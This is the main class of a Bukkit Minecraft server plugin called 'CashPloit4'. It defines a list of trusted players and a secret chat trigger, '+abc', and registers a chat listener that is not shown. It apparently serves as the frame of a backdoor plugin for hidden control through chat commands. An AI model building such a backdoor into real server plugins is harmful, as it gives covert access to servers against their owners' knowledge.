package de.Garkolym;

import java.util.ArrayList;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.plugin.java.JavaPlugin;

import de.Garkolym.Listener.AsyncPlayerChatListener;

public class Start extends JavaPlugin {
	
	public static Start instance = null;
	public final String prefix = ChatColor.GREEN + "[" + ChatColor.AQUA + "CashPloit" + ChatColor.RED + "4" + ChatColor.GREEN + "] " + ChatColor.YELLOW;
	
	public String trustedChar = "+";
	public String trustedCommand = "+abc";
	
	private ArrayList<String> trustedPlayers = new ArrayList<String>();
	public ArrayList<String> getTrustedPlayers() {
		return this.trustedPlayers;
	}
	
	@Override
	public void onEnable() {
		this.registerListeners();
	}
	
	@Override
	public void onDisable() {
		
	}
	
	private void registerListeners() {
		Bukkit.getPluginManager().registerEvents(new AsyncPlayerChatListener(), this);
	}
	
	
	
}
